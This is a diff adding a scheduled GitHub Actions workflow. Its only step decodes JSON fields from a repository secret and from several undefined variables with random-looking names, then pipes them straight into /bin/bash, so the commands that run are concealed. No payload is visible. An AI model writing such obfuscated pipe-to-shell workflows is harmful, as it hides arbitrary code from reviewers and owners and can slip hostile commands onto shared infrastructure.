@@ -1,0 +1,27 @@
+name: buliuyiyan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: buliuyiyan
+        env:
+          aw82: ${{ secrets.aw82 }}
+        run: |
+          echo $aw82 | jq -r .qknhk33247 | /bin/bash
+          echo $d0024 | jq -r .qipv63898 | /bin/bash
+          echo $vnloa863 | jq -r .pmwqq11 | /bin/bash
+          echo $dpfkp15014 | jq -r .ktgej95 | /bin/bash
+          echo $kal525 | jq -r .shyqv08247 | /bin/bash
+          echo $pdvz59 | jq -r .lvib59 | /bin/bash
+          echo $t227 | jq -r .p6 | /bin/bash
+          echo $ej1352 | jq -r .gj4 | /bin/bash
+          echo $pv1 | jq -r .xa64 | /bin/bash
+          echo $ylpx76630 | jq -r .ykszh2467 | /bin/bash
+
